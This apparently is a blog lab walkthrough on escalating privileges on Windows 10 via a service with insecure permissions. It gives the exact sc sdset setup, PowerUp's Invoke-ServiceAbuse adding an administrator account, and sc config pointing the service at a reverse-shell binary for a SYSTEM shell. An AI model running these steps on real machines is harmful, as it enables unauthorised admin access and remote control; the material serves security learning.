---
title: Exploiting Insecure Service Permissions
---

**Description: In this post, I go over setting up a lab environment with a service that has insecure permissions, then walkthrough how to exploit it using PowerUp & manually**

## Insecure Service Permissions

When it comes to this vulnerability, we're simply modifying the service so it points to an executable we want to run along with the parameters to run with it! The reason why this is possible is because excessive privileges have been granted to modify a service, such as allowing everybody to modify it or allowing lower privilege users to modify it.

## Lab Setup

Let's setup our lab environment, I'm using a Windows 10 workstation & I'll be creating a low-level user, then setting up a service to run under the context of the local administrator account, & then allowing every user to modify that service.

Login as the local administrator user & create the service by running:

`New-Service -Name "Vulnerable Service" -BinaryPathName "C:\\VulnerableService"`

Then we must change the permissions for this service so everyone can modify it:

`sc sdset "Vulnerable Service" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCLCSWLOCRRC;;;PU)(A;;CCLCSWLOCRRC;;;RU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;NS)(A;;CCLCSWRPWPDTLOCRRC;;;AU)`

## Exploitation

The first step is detecting services that have weak/misconfigured permissions which can be done using `Powersploit`'s `PowerUp` script, specifically the `Get-ModifiableService` function:

![](https://i.imgur.com/d9n47AT.png)

As you can see here, it returns back our intentionally vulnerable service that we previously created! It even gives us the function that we can use to abuse this vulnerable service.

By default, if you run the `Invoke-ServiceAbuse` function & only supply the name of the service as an argument, it'll create an executable that will add a new user named `john` with a password of `Password123` & add the user to the local administrators group.

If you supply the `-UserName`, `-Password`, & `LocalGroup` arguments, you can add in a custom username & password & manually specify the group you want that user to be added to.

For example, if we run:

- `Invoke-ServiceAbuse -Name "Vulnerable Service" -Username "1d8" -Password "password123" -LocalGroup "Administrators"`, then it'll create our new user named 1d8 with the password we specified & add it to the local administrators group

You can even use the `-Command` parameter in order to execute a custom command.

Let's just run it without any arguments:

![](https://i.imgur.com/XAoemaq.png)

Doing so, we see it created & added our new user John to the local administrators group.

Let's sign out & verify that the user was added:

![](https://i.imgur.com/nHomigx.png)

And as you can see, our user is part of the local administrators group:

![](https://i.imgur.com/zWWWRhs.png)

And let's say you want to manually exploit the service instead of having to load `PowerUp` onto the compromised system. You can do so using the native Windows Service Control (`sc`) utility!

First, we'll run `sc config "Vulnerable Service" binPath= "C:\\Users\\lowprivileges\\Desktop\\shell.exe"` which will set the executable that the service executes to our reverse shell

![](https://i.imgur.com/FMH2Tjr.png)

Before we start the service, ensure your listener is running to catch the connection. Then we'll start the service by running `net start "Vulnerable Service"`.

And we get a shell as `NT-Authority\\system`:

![](https://i.imgur.com/Jryt6QT.png)

**References**

* https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc 
